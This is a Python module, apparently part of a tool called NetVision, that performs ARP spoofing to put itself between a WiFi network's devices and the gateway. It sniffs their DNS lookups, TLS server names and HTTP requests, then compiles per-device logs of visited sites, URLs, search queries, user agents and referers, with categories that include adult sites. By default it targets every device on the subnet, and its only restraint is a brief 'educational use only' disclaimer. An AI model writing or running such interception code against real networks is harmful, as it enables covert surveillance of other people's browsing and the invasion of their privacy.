"""
NetVision — WiFi Activity Spy Module
Intercepts traffic from other devices on the network using ARP spoofing
to monitor their browsing activity (DNS lookups, visited websites, URLs).

⚠️ EDUCATIONAL USE ONLY — Use only on networks you own/have permission to monitor.
"""

import threading
import time
import subprocess
import re
import os
import signal
from datetime import datetime
from collections import defaultdict, deque

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw,
        send, sendp, srp, sniff, get_if_hwaddr, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class BrowsingEntry:
    """Represents a single browsing activity entry."""

    def __init__(self, device_ip, device_mac, entry_type, domain, url=None, 
                 search_query=None, dst_ip=None, extra=None):
        self.timestamp = datetime.now()
        self.device_ip = device_ip
        self.device_mac = device_mac
        self.entry_type = entry_type    # DNS, HTTPS, HTTP, SEARCH
        self.domain = domain
        self.url = url
        self.search_query = search_query
        self.dst_ip = dst_ip
        self.extra = extra or {}

    @property
    def clickable_url(self):
        """Build a clickable URL for terminal hyperlinks."""
        if self.url:
            return self.url
        if self.domain:
            if self.entry_type == "HTTPS":
                return f"https://{self.domain}/"
            return f"http://{self.domain}/"
        return None

    def to_dict(self):
        return {
            "time": self.timestamp.strftime("%H:%M:%S"),
            "device_ip": self.device_ip,
            "device_mac": self.device_mac,
            "type": self.entry_type,
            "domain": self.domain,
            "url": self.url,
            "clickable_url": self.clickable_url,
            "search_query": self.search_query,
            "dst_ip": self.dst_ip,
            "user_agent": self.extra.get("user_agent"),
            "referer": self.extra.get("referer"),
            "content_type": self.extra.get("content_type"),
            "method": self.extra.get("method"),
            "packet_size": self.extra.get("packet_size", 0),
            "category": self.extra.get("category", "Other"),
        }


class WiFiActivityMonitor:
    """
    Monitors browsing activity of all devices on the WiFi network.
    
    How it works:
    1. ARP spoofing: Tells all devices that WE are the gateway
       (so their traffic flows through us)
    2. IP forwarding: Enables kernel IP forwarding so traffic 
       still reaches its destination
    3. Packet sniffing: Captures DNS queries, HTTP requests, 
       and TLS SNI from intercepted traffic
    4. Analysis: Extracts domains, URLs, and search queries
    """

    def __init__(self, interface, gateway_ip, local_ip, targets=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.local_ip = local_ip
        self.gateway_mac = None
        self.local_mac = None
        self.targets = targets or []  # Specific IPs to monitor, empty = all

        self._running = False
        self._arp_thread = None
        self._sniff_thread = None
        self._lock = threading.Lock()

        # Per-device browsing activity: device_ip -> deque of BrowsingEntry
        self._activity = defaultdict(lambda: deque(maxlen=500))

        # Per-device visited domains: device_ip -> {domain: count}
        self._visited_sites = defaultdict(lambda: defaultdict(int))

        # Per-device search queries: device_ip -> [queries]
        self._search_queries = defaultdict(lambda: deque(maxlen=100))

        # Global activity log (all devices)
        self._global_log = deque(maxlen=1000)

        # Stats
        self._stats = {
            "packets_captured": 0,
            "dns_captured": 0,
            "http_captured": 0,
            "https_captured": 0,
            "searches_captured": 0,
            "devices_monitored": set(),
            "arp_packets_sent": 0,
            "total_bytes": 0,
        }

        # Destination IP tracker for geo mapping: dst_ip -> metadata
        self._dst_ip_tracker = {}

        # Domain-to-IP mapping for geo lookups
        self._domain_to_ip = {}

        # Known search engine patterns
        self._search_patterns = {
            "google": re.compile(r"[?&]q=([^&]+)"),
            "bing": re.compile(r"[?&]q=([^&]+)"),
            "yahoo": re.compile(r"[?&]p=([^&]+)"),
            "duckduckgo": re.compile(r"[?&]q=([^&]+)"),
            "youtube": re.compile(r"[?&]search_query=([^&]+)"),
            "amazon": re.compile(r"[?&]k=([^&]+)"),
        }

        # Domain categorization
        self._categories = {
            "Social Media": [
                "facebook.com", "instagram.com", "twitter.com", "x.com",
                "tiktok.com", "snapchat.com", "linkedin.com", "reddit.com",
                "pinterest.com", "tumblr.com", "threads.net", "mastodon",
            ],
            "Video/Streaming": [
                "youtube.com", "netflix.com", "hotstar.com", "primevideo.com",
                "twitch.tv", "vimeo.com", "dailymotion.com", "disneyplus.com",
                "hulu.com", "crunchyroll.com", "jiocinema.com", "sonyliv.com",
            ],
            "Search Engine": [
                "google.com", "bing.com", "yahoo.com", "duckduckgo.com",
                "baidu.com", "yandex.com", "ask.com",
            ],
            "Messaging": [
                "whatsapp.com", "web.whatsapp.com", "telegram.org", "t.me",
                "signal.org", "discord.com", "slack.com", "messenger.com",
            ],
            "Shopping": [
                "amazon.com", "amazon.in", "flipkart.com", "myntra.com",
                "ebay.com", "alibaba.com", "shopify.com", "etsy.com",
            ],
            "News": [
                "cnn.com", "bbc.com", "reuters.com", "ndtv.com",
                "timesofindia.com", "hindustantimes.com",
            ],
            "Adult": [
                "pornhub.com", "xvideos.com", "xnxx.com", "xhamster.com",
            ],
            "Gaming": [
                "steampowered.com", "epicgames.com", "roblox.com",
                "minecraft.net", "ea.com", "ubisoft.com",
            ],
            "Email": [
                "gmail.com", "mail.google.com", "outlook.com", "yahoo.com",
                "protonmail.com", "mail.com",
            ],
            "Cloud/Dev": [
                "github.com", "gitlab.com", "stackoverflow.com",
                "aws.amazon.com", "cloud.google.com", "azure.microsoft.com",
            ],
        }

        # Noise filter — skip these domains
        self._noise_domains = {
            "arpa", "local", "localhost", "in-addr.arpa", "ip6.arpa",
            "_tcp", "_udp", "_dns-sd", "mdns", "mcast.net",
            "connectivity-check", "captive.apple.com",
            "msftconnecttest.com", "msftncsi.com",
            "gstatic.com", "googleapis.com", "googleusercontent.com",
            "cloudflare-dns.com", "dns.google",
            "push.apple.com", "icloud-content.com",
            "app-measurement.com", "firebaseio.com",
        }

    # ─── Setup & Teardown ────────────────────────────────────────────

    def setup(self):
        """Setup ARP spoofing prerequisites."""
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for WiFi monitoring. Install: pip install scapy")

        # Get our MAC address
        try:
            self.local_mac = get_if_hwaddr(self.interface)
        except Exception:
            self.local_mac = self._get_mac_fallback(self.interface)

        # Get gateway MAC address
        self.gateway_mac = self._get_mac(self.gateway_ip)
        if not self.gateway_mac:
            raise RuntimeError(f"Could not resolve gateway MAC for {self.gateway_ip}")

        # Enable IP forwarding
        self._enable_ip_forwarding()

        return True

    def _enable_ip_forwarding(self):
        """Enable IP forwarding so intercepted packets reach their destination."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        except PermissionError:
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                capture_output=True, timeout=5
            )

    def _disable_ip_forwarding(self):
        """Disable IP forwarding on cleanup."""
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except (PermissionError, IOError):
            pass

    def _get_mac(self, ip):
        """Get MAC address for an IP using multiple methods."""
        # Method 1: Scapy ARP request
        try:
            conf.verb = 0
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            answered, _ = srp(packet, timeout=4, verbose=False,
                              iface=self.interface, retry=2)
            if answered:
                return answered[0][1].hwsrc
        except Exception:
            pass

        # Method 2: ip neigh (fastest cached lookup)
        try:
            result = subprocess.run(
                ["ip", "neigh", "show", ip],
                capture_output=True, text=True, timeout=3,
            )
            match = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", result.stdout)
            if match:
                return match.group(1)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Method 3: /proc/net/arp
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip:
                        mac = parts[3]
                        if mac != "00:00:00:00:00:00":
                            return mac
        except (FileNotFoundError, PermissionError):
            pass

        # Method 4: arp command
        try:
            result = subprocess.run(
                ["arp", "-n", ip], capture_output=True, text=True, timeout=5
            )
            match = re.search(r"([0-9a-fA-F:]{17})", result.stdout)
            if match:
                return match.group(1)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        return None

    def _get_mac_fallback(self, interface):
        """Get our own MAC address via ip command."""
        try:
            result = subprocess.run(
                ["ip", "link", "show", interface],
                capture_output=True, text=True, timeout=5
            )
            match = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", result.stdout)
            if match:
                return match.group(1)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return "00:00:00:00:00:00"

    # ─── ARP Spoofing ────────────────────────────────────────────────

    def _arp_spoof(self, target_ip, spoof_ip):
        """Send a spoofed ARP reply to target_ip, claiming we are spoof_ip."""
        try:
            target_mac = self._get_mac(target_ip)
            if target_mac:
                packet = Ether(dst=target_mac) / ARP(
                    op=2,               # ARP reply
                    pdst=target_ip,     # Target IP
                    hwdst=target_mac,   # Target MAC
                    psrc=spoof_ip,      # We claim to be this IP (gateway)
                )
                sendp(packet, verbose=False, iface=self.interface)
                self._stats["arp_packets_sent"] += 1
        except Exception:
            pass

    def _arp_restore(self, target_ip, real_ip, real_mac):
        """Restore the real ARP entry for a target."""
        try:
            target_mac = self._get_mac(target_ip)
            if target_mac and real_mac:
                packet = Ether(dst=target_mac) / ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=real_ip,
                    hwsrc=real_mac,
                )
                sendp(packet, count=5, verbose=False, iface=self.interface)
        except Exception:
            pass

    def _arp_spoof_loop(self):
        """Continuously send ARP spoof packets to intercept traffic."""
        while self._running:
            try:
                if self.targets:
                    # Spoof specific targets
                    for target_ip in self.targets:
                        if target_ip != self.local_ip and target_ip != self.gateway_ip:
                            # Tell target that we are the gateway
                            self._arp_spoof(target_ip, self.gateway_ip)
                            # Tell gateway that we are the target
                            self._arp_spoof(self.gateway_ip, target_ip)
                else:
                    # Spoof the entire subnet — broadcast ARP
                    # Tell gateway we are everyone, tell everyone we are gateway
                    subnet_base = ".".join(self.gateway_ip.split(".")[:3])
                    
                    # Discover active devices first
                    active_devices = self._discover_active_ips()
                    
                    for target_ip in active_devices:
                        if target_ip != self.local_ip and target_ip != self.gateway_ip:
                            self._arp_spoof(target_ip, self.gateway_ip)
                            self._arp_spoof(self.gateway_ip, target_ip)
                            self._stats["devices_monitored"].add(target_ip)

            except Exception:
                pass

            time.sleep(2)  # Re-spoof every 2 seconds

    def _discover_active_ips(self):
        """Discover active IPs on the network."""
        active = set()
        try:
            # Read ARP table
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
                        active.add(parts[0])
        except (FileNotFoundError, PermissionError):
            pass
        return active

    # ─── Packet Sniffing ─────────────────────────────────────────────

    def _sniff_packets(self):
        """Sniff network packets for browsing activity."""
        try:
            conf.verb = 0
            sniff(
                iface=self.interface,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda p: not self._running,
                filter="udp port 53 or tcp port 80 or tcp port 443 or tcp port 8080",
            )
        except Exception as e:
            # Fallback: try without filter
            try:
                sniff(
                    iface=self.interface,
                    prn=self._process_packet,
                    store=False,
                    stop_filter=lambda p: not self._running,
                )
            except Exception:
                pass

    def _process_packet(self, packet):
        """Process a captured packet with deep inspection."""
        try:
            self._stats["packets_captured"] += 1

            if not packet.haslayer(IP):
                return

            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            pkt_size = len(packet)

            # Skip our own traffic
            if src_ip == self.local_ip:
                return

            # Skip if source is not from our network
            local_prefix = ".".join(self.local_ip.split(".")[:3])
            if not src_ip.startswith(local_prefix):
                return

            # Get source MAC
            src_mac = packet[Ether].src if packet.haslayer(Ether) else "unknown"

            # Track destination IPs for geo mapping
            if not self._is_private_ip_check(dst_ip):
                with self._lock:
                    if dst_ip not in self._dst_ip_tracker:
                        self._dst_ip_tracker[dst_ip] = {
                            "first_seen": datetime.now(),
                            "last_seen": datetime.now(),
                            "bytes": 0,
                            "packets": 0,
                            "source_devices": set(),
                        }
                    self._dst_ip_tracker[dst_ip]["last_seen"] = datetime.now()
                    self._dst_ip_tracker[dst_ip]["bytes"] += pkt_size
                    self._dst_ip_tracker[dst_ip]["packets"] += 1
                    self._dst_ip_tracker[dst_ip]["source_devices"].add(src_ip)

            # Process DNS
            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                self._process_dns_query(packet, src_ip, src_mac)

            # Process TCP (HTTP/HTTPS)
            elif packet.haslayer(TCP):
                dst_port = packet[TCP].dport

                if dst_port == 443:
                    self._process_https(packet, src_ip, src_mac, dst_ip, pkt_size)
                elif dst_port in (80, 8080):
                    self._process_http(packet, src_ip, src_mac, dst_ip, pkt_size)

        except Exception:
            pass

    def _is_private_ip_check(self, ip):
        """Quick check if IP is private."""
        try:
            parts = ip.split(".")
            f = int(parts[0])
            s = int(parts[1])
            if f == 10 or (f == 172 and 16 <= s <= 31) or (f == 192 and s == 168) or f == 127:
                return True
        except (ValueError, IndexError):
            pass
        return False

    def _process_dns_query(self, packet, src_ip, src_mac):
        """Process DNS query — reveals what domain the device is looking up."""
        try:
            query_name = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")

            if not query_name or len(query_name) < 3:
                return

            # Filter noise
            if self._is_noise_domain(query_name):
                return

            with self._lock:
                self._stats["dns_captured"] += 1
                self._visited_sites[src_ip][query_name] += 1
                self._stats["devices_monitored"].add(src_ip)

                entry = BrowsingEntry(
                    device_ip=src_ip,
                    device_mac=src_mac,
                    entry_type="DNS",
                    domain=query_name,
                    dst_ip=None,
                    extra={"category": self._categorize_domain(query_name)},
                )
                self._activity[src_ip].append(entry)
                self._global_log.append(entry)

        except Exception:
            pass

    def _process_https(self, packet, src_ip, src_mac, dst_ip, pkt_size=0):
        """Process HTTPS packet — extract SNI to see which site they're visiting."""
        try:
            sni = self._extract_sni(packet)
            if not sni:
                return

            if self._is_noise_domain(sni):
                return

            with self._lock:
                self._stats["https_captured"] += 1
                self._visited_sites[src_ip][sni] += 1
                self._stats["devices_monitored"].add(src_ip)

                # Map domain->IP for location tracking
                self._domain_to_ip[sni] = dst_ip

                entry = BrowsingEntry(
                    device_ip=src_ip,
                    device_mac=src_mac,
                    entry_type="HTTPS",
                    domain=sni,
                    url=f"https://{sni}/",
                    dst_ip=dst_ip,
                    extra={
                        "category": self._categorize_domain(sni),
                        "packet_size": pkt_size,
                    },
                )
                self._activity[src_ip].append(entry)
                self._global_log.append(entry)

        except Exception:
            pass

    def _process_http(self, packet, src_ip, src_mac, dst_ip, pkt_size=0):
        """Process HTTP packet — extract full URL, headers, user-agent, referer."""
        try:
            if not packet.haslayer(Raw):
                return

            payload = bytes(packet[Raw].load).decode("utf-8", errors="ignore")

            # Extract Host header
            host_match = re.search(r"Host:\s*([^\r\n]+)", payload, re.IGNORECASE)
            if not host_match:
                return

            host = host_match.group(1).strip()

            if self._is_noise_domain(host):
                return

            # Extract URL path
            url_match = re.search(r"(GET|POST|PUT|DELETE|PATCH)\s+([^\s]+)\s+HTTP", payload)
            path = url_match.group(2) if url_match else "/"
            method = url_match.group(1) if url_match else "GET"
            full_url = f"http://{host}{path}"

            # Extract User-Agent
            ua_match = re.search(r"User-Agent:\s*([^\r\n]+)", payload, re.IGNORECASE)
            user_agent = ua_match.group(1).strip() if ua_match else None

            # Extract Referer (shows where they came from)
            ref_match = re.search(r"Referer:\s*([^\r\n]+)", payload, re.IGNORECASE)
            referer = ref_match.group(1).strip() if ref_match else None

            # Extract Content-Type
            ct_match = re.search(r"Content-Type:\s*([^\r\n]+)", payload, re.IGNORECASE)
            content_type = ct_match.group(1).strip() if ct_match else None

            # Extract Cookie domains (shows logged-in services)
            cookie_match = re.search(r"Cookie:\s*([^\r\n]+)", payload, re.IGNORECASE)
            cookie_hint = None
            if cookie_match:
                cookie_str = cookie_match.group(1)
                cookie_hint = f"{len(cookie_str)} bytes" if len(cookie_str) > 10 else None

            # Check for search queries
            search_query = self._extract_search_query(host, path)

            with self._lock:
                self._stats["http_captured"] += 1
                self._visited_sites[src_ip][host] += 1
                self._stats["devices_monitored"].add(src_ip)

                # Map domain->IP for location tracking
                self._domain_to_ip[host] = dst_ip

                entry_type = "SEARCH" if search_query else "HTTP"
                if search_query:
                    self._stats["searches_captured"] += 1
                    self._search_queries[src_ip].append(search_query)

                entry = BrowsingEntry(
                    device_ip=src_ip,
                    device_mac=src_mac,
                    entry_type=entry_type,
                    domain=host,
                    url=full_url,
                    search_query=search_query,
                    dst_ip=dst_ip,
                    extra={
                        "method": method,
                        "category": self._categorize_domain(host),
                        "user_agent": user_agent,
                        "referer": referer,
                        "content_type": content_type,
                        "cookie_hint": cookie_hint,
                        "packet_size": pkt_size,
                    },
                )
                self._activity[src_ip].append(entry)
                self._global_log.append(entry)

        except Exception:
            pass

    def _extract_sni(self, packet):
        """Extract Server Name Indication from TLS Client Hello."""
        try:
            if not packet.haslayer(Raw):
                return None

            payload = bytes(packet[Raw].load)

            # TLS record: Content Type = Handshake (0x16)
            if len(payload) < 6 or payload[0] != 0x16:
                return None

            # Handshake Type = Client Hello (0x01)
            if payload[5] != 0x01:
                return None

            # Parse TLS Client Hello
            idx = 43  # Skip to session ID length

            if idx >= len(payload):
                return None

            # Session ID
            session_id_len = payload[idx]
            idx += 1 + session_id_len

            # Cipher suites
            if idx + 2 > len(payload):
                return None
            cipher_len = int.from_bytes(payload[idx:idx+2], 'big')
            idx += 2 + cipher_len

            # Compression methods
            if idx >= len(payload):
                return None
            comp_len = payload[idx]
            idx += 1 + comp_len

            # Extensions
            if idx + 2 > len(payload):
                return None
            ext_total_len = int.from_bytes(payload[idx:idx+2], 'big')
            idx += 2

            ext_end = min(idx + ext_total_len, len(payload))

            while idx + 4 < ext_end:
                ext_type = int.from_bytes(payload[idx:idx+2], 'big')
                ext_len = int.from_bytes(payload[idx+2:idx+4], 'big')
                idx += 4

                if ext_type == 0x0000:  # SNI extension
                    if idx + 5 < len(payload):
                        # SNI list length (2 bytes), type (1 byte), name length (2 bytes)
                        name_len = int.from_bytes(payload[idx+3:idx+5], 'big')
                        if idx + 5 + name_len <= len(payload):
                            sni = payload[idx+5:idx+5+name_len].decode('ascii', errors='ignore')
                            return sni

                idx += ext_len

        except Exception:
            pass

        return None

    def _extract_search_query(self, host, path):
        """Extract search query from URL if it's a search engine."""
        try:
            full_url = f"http://{host}{path}"

            for engine, pattern in self._search_patterns.items():
                if engine in host.lower() or engine in path.lower():
                    match = pattern.search(full_url)
                    if match:
                        from urllib.parse import unquote_plus
                        query = unquote_plus(match.group(1))
                        return query

            # Generic search parameter check
            generic_pattern = re.compile(r"[?&](?:q|query|search|keyword|s)=([^&]+)")
            match = generic_pattern.search(path)
            if match:
                from urllib.parse import unquote_plus
                return unquote_plus(match.group(1))

        except Exception:
            pass

        return None

    # ─── Helpers ──────────────────────────────────────────────────────

    def _is_noise_domain(self, domain):
        """Check if domain is background noise (not user-initiated browsing)."""
        domain_lower = domain.lower()

        for noise in self._noise_domains:
            if noise in domain_lower:
                return True

        # Skip very short or IP-like domains
        if len(domain) < 4:
            return True

        # Skip reverse DNS
        if "arpa" in domain_lower or "in-addr" in domain_lower:
            return True

        # Skip Apple/Android system services
        system_patterns = [
            "apple.com/library", "push.apple", "icloud.com",
            "play.googleapis", "android.clients.google",
            "connectivitycheck", "captive-portal",
            "safebrowsing", "update.googleapis",
            "ocsp.", "crl.", "pki.", "cert.",
        ]
        for pattern in system_patterns:
            if pattern in domain_lower:
                return True

        return False

    def _categorize_domain(self, domain):
        """Categorize a domain into a browsing category."""
        domain_lower = domain.lower()
        for category, patterns in self._categories.items():
            for pattern in patterns:
                if pattern in domain_lower:
                    return category
        return "Other"

    # ─── Start / Stop ─────────────────────────────────────────────────

    def start(self):
        """Start the WiFi activity monitor."""
        self.setup()
        self._running = True

        # Start ARP spoofing thread
        self._arp_thread = threading.Thread(
            target=self._arp_spoof_loop, daemon=True
        )
        self._arp_thread.start()

        # Start packet sniffing thread
        self._sniff_thread = threading.Thread(
            target=self._sniff_packets, daemon=True
        )
        self._sniff_thread.start()

    def stop(self):
        """Stop monitoring and restore ARP tables."""
        self._running = False

        # Restore ARP entries
        if self.gateway_mac:
            active_ips = self._discover_active_ips()
            for ip in active_ips:
                if ip != self.local_ip and ip != self.gateway_ip:
                    self._arp_restore(ip, self.gateway_ip, self.gateway_mac)
                    target_mac = self._get_mac(ip)
                    if target_mac:
                        self._arp_restore(self.gateway_ip, ip, target_mac)

        self._disable_ip_forwarding()

    # ─── Public API ──────────────────────────────────────────────────

    def get_device_activity(self, device_ip, limit=50):
        """Get browsing activity for a specific device."""
        with self._lock:
            entries = list(self._activity.get(device_ip, []))
            return [e.to_dict() for e in entries[-limit:]]

    def get_device_sites(self, device_ip, limit=20):
        """Get most visited sites for a device, sorted by frequency."""
        with self._lock:
            sites = dict(self._visited_sites.get(device_ip, {}))
            sorted_sites = sorted(sites.items(), key=lambda x: x[1], reverse=True)
            return sorted_sites[:limit]

    def get_device_searches(self, device_ip, limit=20):
        """Get search queries made by a device."""
        with self._lock:
            queries = list(self._search_queries.get(device_ip, []))
            return queries[-limit:]

    def get_global_activity(self, limit=50):
        """Get all activity across all devices."""
        with self._lock:
            entries = list(self._global_log)
            return [e.to_dict() for e in entries[-limit:]]

    def get_all_visited_sites(self, limit=30):
        """Get all visited sites across all devices, with device info."""
        with self._lock:
            all_sites = []
            for device_ip, sites in self._visited_sites.items():
                for domain, count in sites.items():
                    all_sites.append({
                        "device_ip": device_ip,
                        "domain": domain,
                        "count": count,
                        "category": self._categorize_domain(domain),
                    })

            all_sites.sort(key=lambda x: x["count"], reverse=True)
            return all_sites[:limit]

    def get_monitored_devices(self):
        """Get list of devices being monitored."""
        with self._lock:
            return list(self._stats["devices_monitored"])

    def get_stats(self):
        """Get monitoring statistics."""
        with self._lock:
            return {
                "packets": self._stats["packets_captured"],
                "dns": self._stats["dns_captured"],
                "http": self._stats["http_captured"],
                "https": self._stats["https_captured"],
                "searches": self._stats["searches_captured"],
                "devices": len(self._stats["devices_monitored"]),
                "arp_sent": self._stats["arp_packets_sent"],
                "total_bytes": self._stats["total_bytes"],
            }

    def get_destination_ips(self):
        """Get all tracked destination IPs with metadata for geo mapping."""
        with self._lock:
            results = {}
            for ip, meta in self._dst_ip_tracker.items():
                results[ip] = {
                    "bytes": meta["bytes"],
                    "packets": meta["packets"],
                    "devices": list(meta["source_devices"]),
                    "last_seen": meta["last_seen"].strftime("%H:%M:%S"),
                }
            return results

    def get_domain_ip_map(self):
        """Get domain-to-IP mapping for geo lookups on visited domains."""
        with self._lock:
            return dict(self._domain_to_ip)

    def get_device_detail(self, device_ip):
        """Get detailed info about a specific device's browsing."""
        with self._lock:
            activity = list(self._activity.get(device_ip, []))
            sites = dict(self._visited_sites.get(device_ip, {}))
            searches = list(self._search_queries.get(device_ip, []))

            # Compute unique domains
            sorted_sites = sorted(sites.items(), key=lambda x: x[1], reverse=True)

            # Gather user agents seen
            user_agents = set()
            referers = []
            for entry in activity:
                ua = entry.extra.get("user_agent")
                if ua:
                    user_agents.add(ua)
                ref = entry.extra.get("referer")
                if ref:
                    referers.append(ref)

            return {
                "total_requests": len(activity),
                "unique_sites": len(sites),
                "top_sites": sorted_sites[:20],
                "searches": searches[-20:],
                "user_agents": list(user_agents)[:5],
                "recent_referers": referers[-10:],
                "recent_activity": [e.to_dict() for e in activity[-30:]],
            }
